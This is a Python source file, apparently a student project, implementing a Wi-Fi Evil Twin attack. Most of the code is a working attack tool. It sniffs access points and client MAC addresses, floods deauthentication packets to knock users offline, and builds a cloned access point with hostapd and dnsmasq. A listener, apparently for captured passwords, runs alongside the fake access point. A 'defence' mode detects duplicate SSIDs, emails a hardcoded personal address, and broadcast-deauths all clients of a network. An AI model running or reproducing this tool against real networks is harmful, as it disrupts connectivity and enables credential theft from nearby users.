from manager import print_regular
from manager import print_header
from manager import print_errors
from manager import bash
from manager import search
from manager import channel_changing
from manager import exit_and_cleanup
from manager import monitor_mode
from manager import Fore
from email_handler import send_email
from string import Template
from password_handler import start_listen
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth

ap_list = []  # networks information MAC , BSSID , and more
defence_ap_list = []  # networks information MAC , BSSID , and more for the defence program
client_list = []  # clients MAC address.
ap_mac = ''  # global MAC Address for the sniffing function


def finding_networks_defence(pkt):
    """
    uses for scapy.sniff function.
    the function check if there is a valid mac address in the pkt
    using haslayer() and Dot11Beacon.
    https://stackoverflow.com/questions/42918505/how-to-get-mac-address-of-connected-access-point
    :param pkt: the packet that is sniffer catch
    :return: void
    """

    if pkt.haslayer(Dot11Beacon):  # there is a valid mac address in the pkt.
        mac_address = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_address not in [x[1] for x in defence_ap_list[0:]]:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            defence_ap_list.append([ap_name, mac_address, channel])
            print_regular('Found new Access Point : SSID = {} , MAC = {}'.format(ap_name, mac_address))


def finding_networks(pkt):
    """
    uses for scapy.sniff function.
    the function check if there is a valid mac address in the pkt
    using haslayer() and Dot11Beacon.
    https://stackoverflow.com/questions/42918505/how-to-get-mac-address-of-connected-access-point
    :param pkt: the packet that is sniffer catch
    :return: void
    """

    if pkt.haslayer(Dot11Beacon):  # there is a valid mac address in the pkt.
        mac_address = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_address not in [x[1] for x in ap_list[0:]]:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            ap_list.append([ap_name, mac_address, channel])
            print_regular('Found new Access Point : SSID = {} , MAC = {}'.format(ap_name, mac_address))


def finding_clients_using_ap_mac(pkt):
    """
    uses for scapy.sniff function. This function gets a packet and check wether the packet includes the AP mac address
    , if so the function will save the client information into a global list
    :param pkt: the packet that is sniffer catch
    :return: void
    """
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
            client_list.append(pkt.addr1)
            print_regular('Found new Client : MAC = {}'.format(pkt.addr1))


def deauthentication_attack(client_mac, access_point_mac, interface):
    """
    Create two packets , one fake packet that will send from the Device to the AP
    and request to disconnect from the AP, and other packet that will send from the AP to the Device ,
    each packet is deauthentication packet.
    :param client_mac represent the client mac address
    :param access_point_mac represent the access point mac address
    :param interface represent the interface that sending the packets
    https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
    """

    client_receive_packet = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac,
                                               addr3=access_point_mac) / Dot11Deauth()
    access_point_receive_packet = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac,
                                                     addr3=client_mac) / Dot11Deauth()
    sendp(client_receive_packet, count=100, iface=interface)
    sendp(access_point_receive_packet, count=100, iface=interface)


def deauthentication_attack_defence(access_point_mac, interface):
    """
    Create two packets , one fake packet that will send from the Device to the AP
    and request to disconnect from the AP, and other packet that will send from the AP to the Device ,
    each packet is deauthentication packet.
    the client mac is ff:ff:ff:ff:ff broadcast (all the clients in this access point)..
    :param access_point_mac represent the access point mac address
    :param interface represent the interface that sending the packets
    https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
    """
    print_errors('perform deauthentication')
    client_mac = 'ff:ff:ff:ff:ff:ff'  # to disconnect all the internet devices
    client_receive_packet = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac,
                                               addr3=access_point_mac) / Dot11Deauth()
    access_point_receive_packet = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac,
                                                     addr3=client_mac) / Dot11Deauth()
    sendp(client_receive_packet, count=100, iface=interface)
    sendp(access_point_receive_packet, count=100, iface=interface)
    timer_obj = threading.Timer(2.0, deauthentication_attack_defence, [access_point_mac, interface])
    timer_obj.start()


def get_ap(index: int):
    """
    return the access point data from the ap_list by giving index
    :param index represent the ap index in the ap_list list
    """
    index = int(index)
    if index in range(len(ap_list)):
        return ap_list[index]
    return None


def get_client(index: int):
    """
        return the access point data from the ap_list by giving index
        :param index represent the client index in the client list
    """
    index = int(index)
    if int(index) in range(len(client_list)):
        return client_list[index]
    return None


class Attack:
    """
    this class is used for execute an Evil Twin attack ...
    """

    def __init__(self):
        """
        prepare the environment - stop all the running network processes
        """
        print_header('Prepare the Attack')
        bash('service NetworkManager stop')
        bash('airmon-ng check kill')
        output = os.popen('iwconfig').read()
        print(output)  # display the interfaces
        self.sniffer = 'invalid'
        self.ap = 'invalid'
        while self.sniffer == 'invalid':
            user_input = input('Please enter the interface name that will be used for sniffing , for example '
                               '\"wlan0\" \n')
            self.sniffer = user_input if search(user_input, output) else 'invalid'
            print_regular('Great! Sniffer interface is {}\n'.format(self.sniffer)) if search(user_input,
                                                                                             output) else print_errors(
                'The interface {} is not part of the list, Please insert one of the interfaces above {}\n'.format(
                    user_input, Fore.WHITE))

        output = os.popen('iwconfig').read()
        print(output)  # display the interfaces
        while self.ap == 'invalid':
            user_input = input('Please enter the interface name that will be used for Fake Access Point , for example '
                               '\"wlan1\" \n')
            self.ap = user_input if search(user_input, output) else 'invalid'
            print_regular(
                'Great! Fake Access Point interface is {}\n'.format(self.ap)) if search(user_input,
                                                                                        output) else print_errors(
                'The interface {} is not part of the list, Please insert one of the interfaces above {} \n'.format(
                    user_input, Fore.WHITE))

        print_regular('change {} interface to monitor mode'.format(self.sniffer))
        monitor_mode(self.sniffer)

    def get_ap_index(self):
        """
        this function searching for networks that we can attack and request from the user to chose the network we want
        to attack
        :return the access point index in ap_list that we want to execute the attack on
        """
        channel_thread = Thread(target=channel_changing, args=(self.sniffer, 15), daemon=True)
        channel_thread.start()
        print_regular('Start Scanning networks , this may take a while...')
        try:
            sniff(prn=finding_networks, iface=self.sniffer, timeout=15)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.get_ap_index.__name__), e)
        channel_thread.join()  # waiting for channel switching to end

        print_header('Networks')
        if len(ap_list) > 0:
            for index in range(len(ap_list)):
                print_regular('[{}] AP Name = {}  MAC Address = {}'.format(index, ap_list[index][0], ap_list[index][1]))
            index = -1
            while index == -1:
                index = input('Please Choose the Network you want to perform an attack on , if you want to explore '
                              'more network Please type \'Rescan\' for a new networks scan\n')
                if index == 'Rescan':
                    return self.get_ap_index()
                elif index in range(len(ap_list)):
                    print_errors('Not a valid option please select one of the networks mentioned above')
                    index = -1
            return index
        else:
            choice = input('No Networks were found , for rescan type \'Rescan\' , to quit type \'quit\' \n')
            if choice == 'Rescan':
                return self.get_ap_index()
            elif choice == 'quit':
                exit_and_cleanup(0, 'GoodBye')

    def get_client_index(self, ap):
        """
        this function searching for clients in a specific access point that we can attack and request from the user to
        chose the client we want to perform attack on.
        :param ap represent the access point to search client on
        :return the client index in client_list that we want to execute the attack on
        """
        channel_thread = Thread(target=channel_changing, args=(self.sniffer, 30, ap[2]), daemon=True)
        channel_thread.start()
        print_regular('Start Scanning clients , this may take a while...')
        global ap_mac
        ap_mac = ap[1]
        try:
            sniff(prn=finding_clients_using_ap_mac, iface=self.sniffer, timeout=30)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.get_ap_index.__name__), e)
        channel_thread.join()  # waiting for channel switching to end
        print_header('Clients')
        if len(client_list) > 0:
            for index in range(len(client_list)):
                print_regular('[{}] MAC Address = {}'.format(index, client_list[index]))
            index = -1
            while index == -1:
                index = input('Please Choose the client you want to perform an attack on , if you want to explore '
                              'more clients Please type \'Rescan\' for a new clients scan\n')
                if index == 'Rescan':
                    return self.get_client_index(ap)
                elif index in range(len(client_list)):
                    print_errors('Not a valid option please select one of the networks mentioned above')
                    index = -1
            return index
        else:
            choice = input('No Clients were found , for rescan type \'Rescan\' , to quit type \'quit\' \n')
            if choice == 'Rescan':
                return self.get_client_index(ap)
            elif choice == 'quit':
                exit_and_cleanup(0, 'GoodBye')

    def deauthentication_attack(self, client_mac, access_point_mac):
        """
        this function perform deauthentication attack by given a client mac adress and access point mac address.
        :param access_point_mac represent the access point to perform the deauthentication attack on
        :param client_mac represent the client to perform the deauthentication attack on
        """
        deauthentication_attack_thread = Thread(target=deauthentication_attack,
                                                args=(client_mac, access_point_mac, self.sniffer))
        deauthentication_attack_thread.start()
        print_regular('deauthentication attack start , This may take a while , Please wait....')
        deauthentication_attack_thread.join()

    def create_fake_access_point(self, access_point_bssid, defence=False):
        """
        this function create similar access point to the access point we want to perform attack on
        :param access_point_bssid represent the access point name.
        :param defence True if we want to perform defence , otherwise False.
               """
        self.prepare_fake_access_point(access_point_bssid)
        print_regular('The Fake Access Point is now available using Name : {} '.format(access_point_bssid))
        listen_thread = Thread(target=start_listen, daemon=True)
        listen_thread.start()
        while True:
            if defence:
                break
            user_input = input('{} to turn off the Access Point Please press \"done\"\n'.format(Fore.WHITE))
            if user_input == 'done':
                exit_and_cleanup(0, 'Done! , thanks for using')
            else:
                print_errors('invalid option...')

    def prepare_fake_access_point(self, access_point_bssid):
        """
        prepare the environment setup for creating the fake access point
        :param access_point_bssid represent the network name
        """
        bash('rm -rf build/')
        bash('cp -r Templates build')
        with open('build/hostapd.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.ap, NETWORK=access_point_bssid))
            f.truncate()
        with open('build/dnsmasq.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.ap))
            f.truncate()
        with open('build/prepareAP.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.ap))
            f.truncate()
        with open('build/cleanup.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(SNIFFER=self.sniffer, AP=self.ap))
            f.truncate()

        bash('sudo sh build/prepareAP.sh')

    def get_sniffer_interface(self):
        """
        :return the sniffer interface
        """
        return self.sniffer

    def get_access_point_interface(self):
        """
        :return the ap interface
        """
        return self.ap


class Defence:
    """
    This class is used to perform defence from an Evil Twin attack.
    """

    def __init__(self, ap_index):
        self.ap_index = ap_index

    def display_problem(self, sniffer_interface):
        """
        Display the duplicates access point , and execute the defence on the Network.
        """
        not_duplicates = []
        duplicates = []

        channel_thread = Thread(target=channel_changing, args=(sniffer_interface, 15), daemon=True)
        channel_thread.start()
        print_regular('Start Scanning networks for finding duplicates, this may take a while...')
        try:
            sniff(prn=finding_networks_defence, iface=sniffer_interface, timeout=15)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(sniffer_interface), e)
        channel_thread.join()  # waiting for channel switching to end

        print_header('Networks')
        if len(defence_ap_list) > 0:
            for index in range(len(defence_ap_list)):
                print_regular('[{}] AP Name = {}  MAC Address = {}'.format(index, defence_ap_list[index][0],
                                                                           defence_ap_list[index][1]))

        for network in defence_ap_list:
            if network[0] in not_duplicates:
                duplicates.append(network)
            else:
                not_duplicates.append(network[0])

        print_header('Duplicates')
        if len(duplicates) > 0:
            for index in range(len(duplicates)):
                print_regular(
                    '{} BSSID = {} , MAC_ADDRESS = {}\n'.format(index, duplicates[index][0], duplicates[0][1]))
            print_header('Preventing attack')
            send_email('danielabergel1@gmail.com', duplicates[0][0])
            timer_obj = threading.Timer(2.0, deauthentication_attack_defence,
                                        [ap_list[int(self.ap_index)][1], sniffer_interface])
            timer_obj.start()
            user_input = input('to end the program please type \"Done\"')
            while user_input == 'invalid':
                user_input = input('to end the program please type \"Done\"')
                user_input = user_input if user_input == 'Done' else 'invalid'
                print_regular('Great Perform clean and exit , thanks') if user_input == 'Done' else print_errors(
                    'the input is {}  that is not \"Done\"  word please try again {}\n'.format(
                        user_input, Fore.WHITE))
            print_regular('im out')

            exit_and_cleanup(0, 'Done')

        else:
            print_errors('The Access Point have failed to upload please...')
            exit_and_cleanup(-1, 'Demonstration has failed , some thing wrong with AP')
